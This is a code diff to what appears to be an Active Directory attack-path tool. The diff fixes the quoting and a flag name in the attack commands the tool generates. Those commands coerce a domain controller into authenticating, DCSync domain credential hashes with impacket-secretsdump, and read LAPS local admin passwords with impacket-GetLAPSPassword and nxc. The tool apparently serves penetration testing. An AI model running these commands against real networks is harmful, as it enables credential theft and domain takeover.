@@ -121,7 +121,7 @@ def find_unconstrained_delegation(G: "nx.DiGraph") -> list[QuickWin]:
                 f"# 2. Coerce a DC to authenticate to {name}:",
                 f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d {d} -l {name} -t <DC_FQDN>",
                 f"# 3. Use the captured DC TGT to DCSync:",
-                f"export KRB5CCNAME=DC.ccache && impacket-secretsdump -k -no-pass -just-dc {d}/<DC_SHORT>\\$@<DC_FQDN>",
+                f"export KRB5CCNAME=DC.ccache && impacket-secretsdump -k -no-pass -just-dc '{d}/<DC_SHORT>$@<DC_FQDN>'",
             ],
         ))
     return out
@@ -170,7 +170,7 @@ def find_laps_readable(G: "nx.DiGraph") -> list[QuickWin]:
             node_kind="computers",
             detail="LAPS is deployed on this host — if you control a principal with ReadLAPSPassword, retrieve the local admin password.",
             commands=[
-                f"impacket-GetLAPSPassword '{d}/<owned_user>:<owned_pass>@<DC_IP>' -computer-name '{_short(name)}'",
+                f"impacket-GetLAPSPassword '{d}/<owned_user>:<owned_pass>@<DC_IP>' -computer '{_short(name)}'",
                 f"# Or via nxc:",
                 f"nxc ldap <DC_IP> -d {d} -u '<owned_user>' -p '<owned_pass>' -M laps",
             ],
